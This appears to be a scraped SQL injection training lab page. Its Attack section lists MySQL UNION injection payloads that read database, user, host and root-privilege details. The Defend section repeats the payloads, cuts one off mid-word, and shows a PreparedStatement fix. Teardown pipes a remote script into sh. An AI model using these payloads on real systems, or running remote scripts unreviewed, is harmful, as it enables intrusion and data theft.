Attack

S


a' UNION ALL SELECT null,DATABASE(),null,null'Copy
You will see the database name under the header First Name

Now try other attacks (Each line is one payload)

a' UNION ALL SELECT null,system_user(),null,null'
a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_os,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_machine,null,null'
a' UNION ALL SELECT null,@@GLOBAL.tls_version,null,null'
a' UNION ALL SELECT null,@@GLOBAL.block_encryption_mode,null,null'
a' UNION ALL SELECT null,@@GLOBAL.default_authentication_plugin,null,null'
a' UNION ALL SELECT null,@@GLOBAL.hostname,null,null'
a' UNION ALL SELECT null,@@GLOBAL.secure_file_priv,null,null'
a' UNION ALL SELECT null,@@GLOBAL.hostname,@@GLOBAL.bind_address,CURRENT_USER()'
a' or '1=1
test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x717a626a71),NULL-- YgfE
test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x717a626a71),NULL-- SSaoCopy
Defend
Step 1: On the browser, access http://<server-ip>:8888/SQLInjection/secure
Substitute your server-ip here for the placeholder <server-ip>

Step 2: In the search bar search for any user you have created based on first name
  
  
  
  a' UNION ALL SELECT null,DATABASE(),null,null'Copy
You will see the database name under the header First Name

Now try other attacks (Each line is one payload)

a' UNION ALL SELECT null,system_user(),null,null'
a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_os,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_machine,null,null'
a' UNION ALL SELECT null,@@GLOBAL.tls_version,null,null'
a' UNION ALL SELECT null,@@GLOBAL.block_encryption_mode,null,null'
a' UNION ALL SELECT null,@@GLOBAL.default_authentication_plu

Step 3: Now test for SQL Injection payload

' or '1=1Copy
This should not return any value

Here the fix is a PreparedStatement query from line numbers 87 to 90 in the file /root/sql-injection/src/main/java/we45/training/labs/Secure.java

Teardown
Step 1: Change to directory
cd /root/sql-injectionCopy
Step 2: Stop the app
curl -sSL https://raw.githubusercontent.com/we45/xml-files/master/clean-docker.sh | shCopy
